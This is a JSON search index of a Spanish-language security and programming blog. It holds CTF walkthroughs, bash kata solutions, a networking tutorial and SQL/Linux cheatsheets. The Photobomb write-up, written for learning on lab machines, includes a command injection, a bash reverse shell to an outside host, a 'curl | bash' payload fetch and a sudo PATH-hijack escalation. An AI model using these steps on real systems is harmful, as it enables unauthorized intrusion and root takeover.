 [
        
        {
            "categories": ["retos"],
            "content": "Trapped SourceEnlace del retoLa dirección que se nos proporciona en este reto nos lleva a la siguiente página web:La cual es una caja fuerte de la cual necesitamos encontrar la combinación. Probando algunas de las más obvias, vemos que no va a ser una tarea sencilla si tratamos de adivinar. Por eso, vamos a ver el código fuente de la página:Código fuenteEl script script.js luce interesante, vamos analizarlo.javascriptUn vistazo a la lógica del código nos dice que este script es el que valida nuestro intento de acceder, y el que nos va a dar la bandera una vez hayamos acertado. En resumidas cuentas:  si nuestro pin es igual al definido como correcto          va a enviar una petición POST a la ruta /flag con header de tipo de contenido JSON, y como cuerpo enviará el pin correcto.        si no          va a mostrar el texto INVALID! y va a resetear el pin que pusimos.      Petición propiaCon esta información, podemos empezar a pensar que no es necesario utilizar la página web, podemos hacer la petición desde la terminal utilizando CURL, agregando cada uno de los campos necesarios. Y como pin podemos poner cualquier cosa, porque en la petición se envía el pin que ya fue validado.12$ curl -sX POST http://138.68.148.72:31634/flag -H \"Content-Type: application/json\" --data '{\"pin\": \"  000\"}'Y de esta manera obtenemos la bandera:",
            "date": "2023-07-30T00:00:00+00:00",
            "objectID": "http://localhost:4000/trapped-source/",
            "id": "http://localhost:4000/trapped-source/",
            "tags": ["retos"],
            "title": "Trapped Source",
            "uri": "/trapped-source/"
        },
        
        {
            "categories": ["maquina"],
            "content": "Photobomb WalkthroughEnlace a la máquinaReconocimientoEmpezaremos con un reconocimiento de los puertos usando nmap.1234567891011$ nmap -Pn -n --min-rate 5000 -p- -sS -vvv -oN all_ports 10.10.11.182Nmap scan report for 10.10.11.182  Host is up, received user-set (0.079s latency).  Scanned at 2023-07-26 09:26:36 CST for 13s  Not shown: 65533 closed tcp ports (reset)  PORT   STATE SERVICE REASON  22/tcp open  ssh     syn-ack ttl 63  80/tcp open  http    syn-ack ttl 63    Read data files from: /usr/bin/../share/nmap  # Nmap done at Wed Jul 26 09:26:49 2023 -- 1 IP address (1 host up) scanned in 13.75 secondsAhora, vamos a lanzar un escaneo más a detalle sobre el puerto 80 y el 22.1234567891011121314151617$ nmap -p 22,80 -sC -sV -Pn -n -oN targeted 10.10.11.182Nmap scan report for 10.10.11.182Host is up (0.081s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://photobomb.htb/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Jul 26 09:28:00 2023 -- 1 IP address (1 host up) scanned in 16.54 secondsPágina webAl parecer tenemos una página web llamada photobomb.htb, vamos a escribir la ip de la máquina en el navegador.El servidor nos indica que hay un sitio con dirección photobomb.htb pero no lo está resolviendo, por lo que vamos a agregar la dirección a nuestra lista de hosts:1$ echo \"10.10.11.182 photobomb.htb\" | sudo tee -a /etc/hosts  Ahora, si recargamos la página, ya podemos ver el sitio photobomb.htb:El único enlace que se nos presenta nos abre un dialogo de acceso, de la cual no pasamos tratando de adivinar las credenciales. Si damos en cancelar, nos redirige a la ruta /printer con error 401.Código fuenteVamos a ver el código fuente de la página, a veces hay cosas interesantes ahí.Podemos ver que hay un script en la línea 6 llamado photobomb.js, vamos a ver qué se esconde ahí.1234567function init() {  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me  if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) {    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');  }}window.onload = init;Al parecer, lo que hace este script es dar el ingreso a los usuarios que tengan una cookie llamada isPhotoBombTechSupport, y los redirige a una url con las credenciales de acceso en ella. Así que podemos ir nosotros a esa misma url, o ingresar pH0t0 como usuario y b0Mb! como contraseña.PrinterY tenemos acceso a /printer. La funcionalidad de esta página parece ser para re escalar imágenes que luego podemos descargar para imprimir, de hecho si seleccionamos una imagen y un tamaño, podemos descargar la imagen a nuestro equipo.Una de las cosas que observé fue que la primera vez que seleccionas una resolución diferente a la que está por default, la página tarda un poco en tener lista la descarga, pero la segunda vez que solicitas la imagen es inmediata la descarga, sospecho que se trata de un re escalamiento por medio de un comando, que tarda unos segundos en procesar la imagen al tamaño deseado, y guarda las copias temporalmente.Burp SuiteVamos a usar el proxy de Burp Suite para ver las peticiones que se están enviando.Y una vez tengamos la petición, la mandamos al Repeater.Observamos tres campos que se están mandando:  El nombre de la imagen  El tipo  Y las dimensionesPuede ser que en el servidor se esté ejecutando un comando que utilice esos 3 argumentos para generar la imagen, algo así como:1$ resize -n \"mark-mc-neill-4xWHIpY2QcY-unsplash.jpg\" -t \"jpg\" -s \"30x20\"Esto no nos permitiría inyectar comandos, porque lo que introduzcamos estaría siendo tomado como cadena, pero si el comando luce más como:1$ resize -n mark-mc-neill-4xWHIpY2QcY-unsplash.jpg -t jpg -s 30x20Habría una vulnerabilidad a inyección de comandos, por lo que si introducimos un ; muy probablemente causaremos un error en el proceso. Probemos uno por uno.El único campo que parece ser vulnerable es el filetype, cuando insertamos un punto y coma, el servidor tarda en responder y finalmente nos dice que falló en generar una copia de la imagen, diferente a la respuesta que obteníamos con los otros campos.Pero para estar seguros insertemos un comando que nos pueda dar una señal de que se está ejecutando, pues no obtendremos respuesta en formato de texto. Usemos sleep, si se ejecuta conseguiremos que el servidor tarde x tiempo en responder. Inyectemos ;sleep+15 (el + sustituye al espacio).Y efectivamente, el servidor tarda &gt; 15 segundos en responder. Tenemos una inyección de comandos.AtaqueCon esta vulnerabilidad deberíamos buscar una reverse shell que nos deje entrar al equipo.Reverse shellScript para la reverseVamos a crear un archivo index.html que podamos servir a través de un servidor http, y que contenga el script para la reverse shell:1bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.13/4040 0&gt;&amp;1\"Servidor httpEn el directorio donde se encuentra index.html vamos a ejecutar:1$ python -c http.server 80ncY vamos a escuchar a conexiones entrantes con nc:1$ nc -nlvp 4040InyecciónEs momento de inyectar el comando que nos de la reverse shell: ;curl+10.10.14.10+|+bash.Tenemos una reverse, ahora faltaría acondicionarla.Primer banderaLa encontramos en nuestro directorio home.EscalamientoVeamos si tenemos algún permiso como sudo o estamos en algún grupo privilegiado.123456789$ id  uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)  $ sudo -l  Matching Defaults entries for wizard on photobomb:     env_reset, mail_badpass,     secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin    User wizard may run the following commands on photobomb:     (root) SETENV: NOPASSWD: /opt/cleanup.shNingún grupo importante, pero vemos que podemos ejecutar el script cleanup.sh como root sin utilizar contraseña (NOPASSWD) y conservando nuestro PATH (SETENV). Lo que ya nos da una idea de PATH hijacking. Pero veamos el script cleanup.sh:12345678910111213#!/bin/bash  . /opt/.bashrc  cd /home/wizard/photobomb    # clean up log files  if [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]  then   /bin/cat log/photobomb.log &gt; log/photobomb.log.old   /usr/bin/truncate -s0 log/photobomb.log  fi    # protect the priceless originals  find source_images -type f -name '*.jpg' -exec chown root:root {} \\;Este script carga su configuración de un .bashrc ubicado en el mismo directorio y luego hace una copia del photobomb.log, por último, con find protege las imágenes originales.Revisemos .bashrc:12345678910111213141516171819# System-wide .bashrc file for interactive bash(1) shells.    # To enable the settings / commands in this file for login shells as well,  # this file has to be sourced in /etc/profile.    # Jameson: ensure that snaps don't interfere, 'cos they are dumb  PATH=${PATH/:\\/snap\\/bin/}    # Jameson: caused problems with testing whether to rotate the log file  enable -n [ # ]    # If not running interactively, don't do anything  [ -z \"$PS1\" ] &amp;&amp; return    # check the window size after each command and, if necessary,  # update the values of LINES and COLUMNS.  shopt -s checkwinsize    -- SNIP --Ninguno de estos dos archivos tiene permisos de escritura, por lo que debe haber una forma de ganar acceso al root con solamente ejecutarlos. Algo raro que se hace en .bashrc es lo que está en la línea 10: enable -n [, lo que esto hace es deshabilitar el comando [ (sí, el corchete es un comando).Así que, cuando se ejecuta el script cleanup.sh, el binario [ nativo no será ejecutado, dándonos oportunidad de especificar la ruta de un binario con el mismo nombre, pero que nos sea más útil.Ejecutable maliciosoCreemos un ejecutable llamado [ que será el que se ejecute cuando lancemos el script como root. Su contenido será una simple llamada a una bash, que se ejecutará bajo el mismo usuario que el script, es decir, root.12345$ cd /tmp$ cat &gt; [bash^C$ chmod +x [Ahora, lo que queda hacer es lanzar el script incluyendo en el PATH la ruta de nuestro ejecutable malicioso en primer lugar para garantizar que se ejecute antes de cualquier otro binario con el mismo nombre:1$ sudo PATH=/tmp:$PATH /opt/cleanup.shSegunda banderaBoom. Tenemos una bash como usuario root.",
            "date": "2023-07-30T00:00:00+00:00",
            "objectID": "http://localhost:4000/photobomb/",
            "id": "http://localhost:4000/photobomb/",
            "tags": ["maquina"],
            "title": "Photobomb",
            "uri": "/photobomb/"
        },
        
        {
            "categories": ["programacion"],
            "content": "IP ValidationEnlace al KataResumenEn este Kata lo que tenemos que hacer es comprobar el correcto formato de direcciones IPv4. Simplemente eso.Instrucciones (traducidas)Escribe un algoritmo que identifique direcciones IPv4 válidas en formato punto decimal. Las IPs serán consideradas válidas si consisten de cuatro octetos, con valores entre 0 y 255.Ejemplos de entradas válidas123Examples of valid inputs:1.2.3.4123.45.67.89Ejemplo de entradas no válidas12341.2.31.2.3.4.5123.456.78.90123.045.067.089Notas  Ceros al principio (ej. 01.02.03.04) son considerados inválidos  Se garantiza que la entradas es una sóla cadenaSolucionesMi soluciónEn esta solución no pondré algoritmo porque es un enfoque muy lineal, una condicional para cada requisito, si se cumple pasa a la siguiente condicional, sino termina el programa con un False, si el programa llega al final termina con un True.Código1234567891011121314151617adr=\"$1\"re=\"^[0-9.]+$\"! [[ $adr =~ $re ]] &amp;&amp; echo \"False\" &amp;&amp; exit  # sólo números y puntosIFS=\".\" read -ra octet &lt;&lt;&lt; \"$adr\"  # separar por puntos[[ ${#octet[@]} -ne 4 ]] &amp;&amp; echo \"False\" &amp;&amp; exit  # 4 octetosfor oct in ${octet[@]}; do  ! [[ ${#oct} -le 3 ]] &amp;&amp; echo \"False\" &amp;&amp; exit  # 3 o menos digitos en cada octeto  ! [[ $oct -ge 0 &amp;&amp; $oct -le 255 ]] &amp;&amp; echo \"False\" &amp;&amp; exit  # rango de 0 a 255   [[ $oct =~ ^0[1-9]+$ ]] &amp;&amp; echo \"False\" &amp;&amp; exit  # ceros al principiodoneecho \"True\"Es una solución sencilla y fácil de entender, utilicé la sintáxis que aprendí en la solución del anterior Kata para hacer las verificaciones necesarias, y lo combiné con expresiones regulares (regex).Sin embargo, viendo otras soluciones, encontré maneras de hacer el problema en menos líneas.Otras solucionesLa más cortaEsta solución fue hecha por el usuario zimo, tiene un enfoque más directo, y aunque parece complicada de entender, si la separas por partes es fácil comprender.1echo \"$1\" | egrep -q \"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$\" &amp;&amp; echo \"True\" || echo \"False\"Básicamente lo que hace esta solución es:  Pasar la cadena de la IP ($1) a egrep (también es posible grep -E) para que busque el patrón entre comillas de manera silenciosa (-q).  Se busca el patrón ([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.) al inicio de la cadena, lo que hace coincidir a las siguientes cadenas:          de un digito con rango del 0 al 9 ó ([0-9]|)      de dos digitos con rango de 10 al 99 ó ([1-9][0-9]|)      de tres digitos del 100 al 199 ó (1[0-9]{2}|)      de tres digitos del 200 al 249 ó (2[0-4][0-9]|)      de tres digitos del 250 al 255 (25[0-5])        Cualquiera de las anteriores cadenas termina con un punto (\\.), eso valida el octeto  La cadena tiene que tener 3 octetos con esas mismas reglas ({3})  El último octeto comprueba lo mismo que en el punto 2. A diferencia de los otros octetos, éste no termina con un punto.  Finalmente, si eso se cumple, se regresa un True, si no se regresa False.Nuevo intentoViendo las soluciones de la comunidad, noté que el patrón ([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.) se utiliza mucho, y creo que es la mejor forma de hacerlo. Así que modifiqué la solución de zimo, combinando sintaxis de mi anterior solución, sin utilizar grep para hacer una oneliner que quedó de esta forma:1o=\"([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\" &amp;&amp; [[ $1 =~ ^(($o\\.){3}$o)$ ]] &amp;&amp; echo \"True\" || echo \"False\"Que incluso fue un poco más corta que la propuesta original.Lo que aprendíEn mi código  Recordar un poco sobre regex.  Aplicar la sintaxis de soluciones externas vistas en el anterior KataEn el código de zimo  Con un poco de ingenio se pueden crear patrones para capturar lo que se busca.",
            "date": "2023-06-25T00:00:00+00:00",
            "objectID": "http://localhost:4000/ip-validation/",
            "id": "http://localhost:4000/ip-validation/",
            "tags": ["programacion"],
            "title": "IP Validation",
            "uri": "/ip-validation/"
        },
        
        {
            "categories": ["programacion"],
            "content": "Prize DrawEnlace al kata: 5/5 🖤  En este problema se nos pide encontrar el nombre ganador de un sorteo, como datos de entrada tenemos una lista de nombres, una lista de pesos y una posición que será el nombre seleccionado. Para cada nombre tendremos que sumar el valor de todas sus letras, sumar la longitud del nombre y por último multiplicar por el peso que le corresponde de la lista, el resultado es un número ganador para cada nombre. Con todos los números ganadores obtenidos tendremos que ordenarlos de mayor a menor (si hay dos números ganadores iguales se ordenará además alfabéticamente). Por último, devolveremos al nombre en la posición solicitada.InstruccionesInstrucciones traducidasPara participar en un sorteo cada quien da su nombre.Cada letra del nombre tiene un valor el cual es su posición en el alfabeto inglés. A y a tienen una posición 1, B y b posición 2 y así.La longitud del nombre se suma a la suma de esas posiciones, de ahí un número som.Un array de pesos aleatorios está ligado a los nombres y cada som es multiplicado por su correspondiente peso para obtener lo que llaman un número ganador.Ejemplo12345names: \"COLIN,AMANDBA,AMANDAB,CAROL,PauL,JOSEPH\"weights: [1, 4, 4, 5, 2, 1]PauL -&gt; som = longitud del nombre + 16 + 1 + 21 + 12 = 4 + 50 -&gt; 54El *peso* asociado con PauL es 2 así que el *número ganador* de PauL es  54 * 2 = 108.Ahora se pueden ordenar los nombres en el orden decreciente de los números ganadores. Cuando dos personas tienen el mismo número ganador ordénalos alfabéticamente por sus nombres.Tareas  parametros: st una cadena de nombres, we un array de pesos, n una posición  regresar: el nombre del participante con la posición n (posiciones son numeradas a partir de 1)Ejemplo12345names: \"COLIN,AMANDBA,AMANDAB,CAROL,PauL,JOSEPH\"weights: [1, 4, 4, 5, 2, 1]n: 4La función debe regresar: \"PauL\"Notas  El array de pesos es por lo menos tan largo como la cantidad de nombres, puede ser más largo.  Si st está vacía, regresa “No participants”.  Si n es más grande que el número de participantes, entonces regresa “Not enough participants”.Mi soluciónEsta solución la fui desarrollando en la marcha, pues realmente sólo sabía lo básico sobre variables, condicionales, funciones y ciclos, pero sin recordar al cien por ciento la sintáxis. Consulté bastantes páginas para saber cómo se hacía lo que tenía en mente, lo que me daba errror y sobre como refactorizar mi código.AlgoritmoCódigoCódigo con comentarios en español123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#!/bin/bash# valida los datos de entradavalidate () {  if [[ -z $1 ]]; then    echo \"No participants\"      elif [[ $(echo $1 | tr \",\" \"\\n\" | wc -l) -lt $3 ]]; then    echo \"Not enough participants\"    else    rank $1 $2 $3      fi   }# procesa y ordena los nombresrank () {  # pasa a minúsculas los nombres  list=\"${1,,}\"  # separa nombres y pesos  IFS=\",\" read -ra names &lt;&lt;&lt; \"$list\"   IFS=\",\" read -ra wghts &lt;&lt;&lt; \"$2\"   # obtiene cada nombre  for i in $(seq 0 $(( ${#names[@]} -1 ))); do    name=\"${names[i]}\"    total=0\t# obtiene cada letra y su valor    for j in $(seq 0 $(( ${#name} -1 ))); do      #total=$((total + $(echo $abc | cut -d \"${name:j:1}\" -f 1 | wc -c)))  # calcula el total en una línea, pero se mantuvo dando Execution Timed Out            local value=$(charValue ${name:j:1})      total=$((total + value))          done\t# calcula los números ganadores ((total + len) * weight)    w_num=$(( $((total + ${#name})) * ${wghts[i]} ))\t# cadena de nombres y números ganadores    nms_wnum+=\"$name $w_num,\"      done            # ordena primero por el número ganador y luego por nombre  sorted=$(echo $nms_wnum | tr \",\" \"\\n\" | sort -k 2,2nr -k 1,1 | tr \" \" \":\")  # obtiene el nombre de la posición deseada  name=$(echo $sorted | tr \" \" \"\\n\" | nl -s\" \" -w1 | grep -w \"$3\" | cut -d \":\" -f 1 | cut -d \" \" -f 2)  # devuelve el nombre con la primer letra en mayúscula  echo ${name^}    }# obtiene los valores indivuduales de las letrascharValue () {  abc=\"abcdefghijklmnopqrstuvwxyz\"  # corta la cadena abc con el argumento dado  IFS=\"$1\" read -ra tmp &lt;&lt;&lt; \"$abc\"  # obtiene la longitud de la variable tmp  local value=$(( ${#tmp} +1 ))  echo $value  }validate \"$1\" \"$2\" \"$3\"Cuando finalicé me sentí como si hubiera escrito el código para echar a andar un transbordador espacial, y aunque sabía que seguramente había soluciones mucho mejores, me gustó el Kata porque fue mi primer reto real en bash.Otras solucionesSolución propuesta por el usuario DEV0001. Código comentado por mí.12345678910111213141516171819202122232425262728293031#!/bin/bashrank () {  # separa los nombres y los pesos  IFS=\",\" read -r -a names &lt;&lt;&lt; \"$1\"  IFS=\",\" read -r -a weights &lt;&lt;&lt; \"$2\"  rank=\"$3\"  # hace las validaciones  [[ ${#names[@]} -eq 0 ]] &amp;&amp; echo \"No participants\" &amp;&amp; exit  [[ ${rank} -gt ${#names[@]} ]] &amp;&amp; echo \"Not enough participants\" &amp;&amp; exit  # recorre todos los nombres  for i in ${!names[@]}; do\t# obtiene la longitud del nombre    let res=${#names[$i]}\t# recorre los carácteres del nombre    for chr in $(echo \"${names[$i]}\" | tr [A-Z] [a-z] | grep . -o); do\t  # encuentra el valor del carácter      let res+=$(eval echo {a..${chr}} | tr \" \" \"\\n\" | wc -l)    done\t# obtiene el número ganador    let res*=${weights[$i]}    # da la cadena con el número ganador y el nombre    echo \"${res} ${names[$i]}\"  done \\    # termina el ciclo y manda la salida al comando sort, ordena por la primer y segunda columna y manda la salida a awk  # awk obtiene la posición deseada e imprime el nombre  | sort -k 1nr,2 | awk -v \"n=${rank}\" '(NR==n){print $2}'}rank \"$1\" \"$2\" \"$3\"Esta solución es la más corta y fácil de entender que encontré. Da solución al problema de una forma elegante y ordenada.Lo que aprendíEn mi código  Diccionarios en bash  Separar cadenas  Ordenar múltiples columnas (originalmente me ayudé de ChatGPT)  Mucha sintáxisEn el código de DEV0001  Se pueden utilizar sólo corchetes dobles para validaciones o tests  awk es bastante útil para procesar cadenas  Algunas otras soluciones ingeniosas",
            "date": "2023-06-17T00:00:00+00:00",
            "objectID": "http://localhost:4000/prize-draw/",
            "id": "http://localhost:4000/prize-draw/",
            "tags": ["programacion"],
            "title": "Prize Draw",
            "uri": "/prize-draw/"
        },
        
        {
            "categories": ["redes"],
            "content": "La red más simpleRed  Una red es un conjunto de computadoras que están conectadas en un medio común y comparten información entre sí.La red más grande que existe es internet, es una red a la que se conectan millones de dispositivos y que te permite ver esta página web. Pero dejando de lado internet, también utilizas otras redes más pequeñas en tu día a día, por ejemplo, cuando conectas tu smarthpone a una bocina o audifonos bluetooth, estás conectándote a la red de ese dispositivo y por lo tanto puedes intercabiar información con él.Existen distintos tipos y topologías de redes, pero en este post vamos a ver la red más simple utilizando el simulador Cisco Packet Tracer.ConstrucciónAgregar los equiposPara esta red vamos a agregar 2 PCs o laptops al espacio lógico.ConexiónAhora conectaremos estos dos equipos utilizando el Cable de cable cruzado desde el puerto FastEthernet0 al mismo del otro equipo.Ya tenemos una red, sin embargo si probamos hacer envíar una PDU simple de un equipo al otro, vamos diciendo que no hay puertos funcionales para el dispositivo. Esto pasa porque necesitamos agregar una dirección IP a cada equipo, de esa manera los dispositivos tendran una identificación y el otro podrá comunicarse con él.Agregar dirección IPPara agregar una dirección IP vamos a ingresar a la configuración de IP como se muestra en la imagen:En la ventana que se nos abre vamos a llenar los siguientes campos:  IPv4 Address: 192.168.0.1  Subnet Mask: 255.255.255.0Y cerramos la ventana. Ahora podemos posar el cursor sobre la PC y veremos que ya tiene una dirección IP asignada.Ahora vamos a repetir el proceso con la laptop utilizando ahora la dirección IP 192.168.0.2 con la misma máscara de subred.Por último pondré en notas (presionando la tecla N) la dirección de los equipos.",
            "date": "2023-05-07T00:00:00+00:00",
            "objectID": "http://localhost:4000/la-red-mas-simple/",
            "id": "http://localhost:4000/la-red-mas-simple/",
            "tags": ["redes"],
            "title": "La red más simple",
            "uri": "/la-red-mas-simple/"
        },
        
        {
            "categories": ["mr_robot"],
            "content": "Mr. Robot  Mr. Robot es drama centrado en Elliot, un hacker que trabaja en una monótona empresa de ciberseguridad. Sin embargo, todo cambia cuando es reclutado por un grupo de hackers que tienen como meta un objetivo simple: cambiar el sistema que gobierna al mundo.¿Por qué te hablo de Mr. Robot?La serie está inspirada en técnicas reales de hacking, no todo lo mostrado es cien por ciento apegado a la realidad, pero es una de las mejores representaciones de hacking en series y películas que conozco.Por lo que, si estás empezando en el mundo de la ciberseguridad es una buena forma de tener un acercamiento al mundillo del hacking.Y aún si ya tienes experiencia en el área, si buscas una serie que te mantenga pegado al asiento y que te haga querer cambiar el sistema, Mr. Robot es lo mejor que te puedo recomendar. Además, ¿por qué no ver una de las series que tiene algunos de los capítulos mejores puntuados en IMDB?.¿Cómo ver la serie?Dos pasos:  Ve un capítulo  Consulta el post del capítulo aquíTan simple como eso. Y es que como te comenté arriba, muchas de las escenas en el show tienen bases reales, por lo que probablemente escucharás términos de redes, hacking y sistemas de las que jamás hayas escuchado antes (no te preocupes, a mí también me pasó la primera vez que lo vi). Por eso he estado haciendo resúmenes y explicaciones de cada uno de los episodios de la serie, donde repaso las escenas importantes para que no te sientas perdido. Además es una buena forma de seguir aprendiendo.En cada post doy un resumen no tan exhaustivo, pero dejo enlaces en cada tema a vídeos, artículos u otros posts para que si te interesa, profundices más en el tema.",
            "date": "2023-05-05T00:00:00+00:00",
            "objectID": "http://localhost:4000/mr-robot/",
            "id": "http://localhost:4000/mr-robot/",
            "tags": ["mr_robot"],
            "title": "Mr. Robot",
            "uri": "/mr-robot/"
        },
        
        {
            "categories": ["maquina"],
            "content": "Pickle RickEnlace: https://tryhackme.com/room/picklerickInstrucciones:Este reto con tema de Rick y Morty requiere que explotes un servidor web para encontrar 3 ingredientes que ayudarán a Rick a hacer su poción para transformarse de nuevo en humano de su forma de pepinillo.Una vez que nos hayamos conectado a través de VPN a la máquina empezaremos con la fase de reconocimiento.ReconocimientonmapLo primero que haremos es ejecutar nmap para descubrir los puertos del sistema objetivo:1$ nmap -n -Pn &lt;ip&gt; Vemos que hay dos puertos abiertos, empezaremos por revisar el servidor web del puerto 80 (las instrucciones nos mencionaban un servidor web).Servidor webLa página principal nos da a entender que habrá un login, pero al parecer tendremos que encontrar las credenciales por nuestra cuenta.Ver este servidor web me dio ganas de utilizar gobuster.gobusterVamos a enumerar los directorios web de este servidor con la wordlist /dirb/common.txt, quizá nos encontremos algo interesante.1$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://&lt;ip&gt;Los páginas disponibles (status: 200) son:  index.html  robots.txt  login.phpEfectivamente hay un login, pero aún necesitamos un usuario y contraseña, tal vez el contenido de robots.txt sea una de las dos:No nos quedan más páginas para analizar, pero tal vez revisando el código fuente nos sea útil, veamos el de login.php:Podemos ver que Rick utilizó un comentario para guardar su usuario, por lo tanto, el texto que encontramos en robots.txt puede que sea nuestra contraseña, intentemos con eso.Ataque¡Encontramos las credenciales del login! Ahora parece que tenmos acceso a una web shell, si introducimos pwd nos regresa:Por lo tanto, podemos utilizar este formulario para navegar por el sistema y encontrar los ingredientes necesarios. Hay que tener en cuenta que si utilizamos cd, no habrá un efecto en nuestra ruta actual, por lo que usaremos rutas absolutas.Primer ingredienteSi hacemos un ls, vemos los archivos que están en el directorio del servidor web, y hay uno sospechoso con nombre Sup3rS3cretPicl3Ingred.txt. Veamos qué contiene.Al parecer cat, less, head y otros comandos están siendo bloqueados en esta web shell, así que usaremos nl para ver el contenido.Así que, aquí tenemos el primero, veamos dónde están los otros. El archivo clue.txt nos dice que busquemos en todo el sistema, así que revisemos los directorios home.Segundo ingredienteEl directorio /home/rick contiene un archivo llamado second ingredients, vaya, vaya…Sólo nos falta uno, sigamos.",
            "date": "2023-04-16T00:00:00+00:00",
            "objectID": "http://localhost:4000/pickle-rick/",
            "id": "http://localhost:4000/pickle-rick/",
            "tags": ["maquina"],
            "title": "Pickle Rick",
            "uri": "/pickle-rick/"
        },
        
        {
            "categories": ["cheatsheet"],
            "content": "MariaDBBase de datos            Acción      Comando                  Crear      CREATE DATABASE nombre_db;              Eliminar      DROP DATABASE nombre_db;              Listar      SHOW DATABASES;      Tablas            Acción      Comando      Descripción                  Crear tabla      CREATE TABLE nombre_tabla(columna1 INT(5) AUTO_INCREMENT PRIMARY KEY NOT NULL, columna2 VARCHAR(20) NOT NULL DEFAULT \"x\", columna3 DATE);      Crea una tabla con tres columnas con sus respectivos tipos de datos              Eliminar tabla      DROP TABLE nombre_tabla;      Elimina la tabla especificada              Listar      SHOW TABLES;      Lista todas las tablas de la base de datos      Modificar            Acción      Comando      Descripción                  Agregar columna      ALTER TABLE nombre_tabla ADD COLUMN nueva_columna DECIMAL(6,2) NOT NULL AFTER columna2;      Agrega una nueva columna especificando su tipo de dato después de cierta columna              Cambiar tipo de columna      ALTER TABLE nombre_tabla MODIFY columna VARCHAR(20) NOT NULL UNIQUE;      Altera el tipo de dato que almacena la columna              Cambiar nombre de columna      ALTER TABLE nombre_tabla CHANGE COLUMN nombre nuevo_nombre DECIMAL(6,2) NOT NULL;      Cambia el nombre de una columna a la vez que se especifica su tipo de dato      Llaves            Acción      Comando      Descripción                  Agregar PK      ALTER TABLE nombre_tabla ADD PRIMARY KEY(columna);      Establece como llave primaria una columna de la tabla              Eliminar PK      ALTER TABLE nombre_tabla DROP PRIMARY KEY;      Elimina la llave primaria de una tabla              Agregar FK      ALTER TABLE nombre_tabla ADD CONSTRAINT FOREIGN KEY(columna) REFERENCES tabla2(col_pk);      Establece una llave foránea que referencia a la llave primaria de otra tabla              Eliminar FK      ALTER TABLE nombre_tabla DROP FOREIGN KEY col_fk;      Elimina la llave foránea de una columna      RegistrosMostrar            Acción      Comando      Descripción                  Mostrar todos      SELECT * FROM nombre_tabla;      Muestra todos los registros de la tabla especificada              Mostrar algunas columnas      SELECT col1, col2, col3 FROM nombre_tabla;      Muestra todos los registros de las columnas especificadas              Filtrar      SELECT * FROM nombre_tabla WHERE columna = \"xxx\";      Muestra los registros donde columna tenga valor xxx              Ordenar      SELECT col1, col2 FROM nombre_tabla ORDER BY col2 ASC LIMIT 0,20;      Muestra los 20 registros de las columnas especificadas, ordenando en formato ascendente la columna 2              Agrupar      SELECT * FROM nombre_tabla GROUP BY columna;      Muestra los registros agrupados por la columna especificada      Actualizar y borrar            Acción      Comando      Descripción                  Actualizar      UPDATE nombre_tabla SET col1 = \"xxx\" col2 = \"yyy\", WHERE col3 = \"zzz\";      Actualiza los registros que coincidan con la cláusula WHERE, si no se utiliza WHERE se actualizará toda la tabla              Borrar      DELETE FROM nombre_tabla WHERE identifier = \"xxx\";      Borra los registros que coincidan con la condición, al igual que UPDATE si no se usa WHERE se eliminarán todos los registros de la tabla      Importar / ExportarLos siguientes comandos se ejecutan desde la terminal del usuario.            Acción      Comando      Descripción                  Importar      mariadb -u usuario -p nombre_bd &lt; script.mysql      Importa el contenido del script en la bd especificada              Exportar      mysqldump -u usuario -p nombre_bd &gt; bd.mysql      Exporta el contenido de una bd a un script      ",
            "date": "2023-04-14T00:00:00+00:00",
            "objectID": "http://localhost:4000/sql-cheatsheet/",
            "id": "http://localhost:4000/sql-cheatsheet/",
            "tags": ["cheatsheet"],
            "title": "Cheatsheet de MariaDB",
            "uri": "/sql-cheatsheet/"
        },
        
        {
            "categories": ["[&quot;cheatsheet&quot;, &quot;linux&quot;]"],
            "content": "Comandos en LinuxSintaxis general de los comandos en Linux:123$ comando -opcion argumentos$ ls -la /etc/  # ejemplo $ ls /etc/ -la  # tambien es posible. menos comunBuscar archivos            Descripción      Comando                  Busca un archivo en todo el sistema, propiedad del usuario usuario7 y del grupo grupo6 con tamaño de 33 bytes      find / -type f -size 33c -user usuario7 -group grupo6 2&gt;/dev/null              Busca un archivo en el directorio actual, sin permisos de ejecución, con tamaño de 1033 bytes y muestra su contenido      find ./ -type f ! -executable -size 1033c -exec cat {} \\;      Manipulación de textoCambiar posición de caractéres            Descripción      Comando                  Rota los caractéres 13 posiciones (cifra Caesar)      cat &lt;file&gt; | tr [a-mn-zA-MN-Z] [n-za-mN-ZA-M]      Eliminar palabras            Descripción      Comando                  Elimina palabras de menos de x caractéres      sed -r '/^.{,&lt;x&gt;}$/d' &lt;archivo&gt;              Elimina palabras sin caractéres especiales      sed -r '/[!-/:-@\\[-\\{-~]+/!d' &lt;archivo&gt;              Elimina palabras sin números      sed -ri '/[0-9]+/!d' &lt;archivo&gt;      Administración de usuarios y gruposLos siguientes comandos se ejecutan con sudo o con usuario root.Usuarios            Acción      Comando      Descripción                 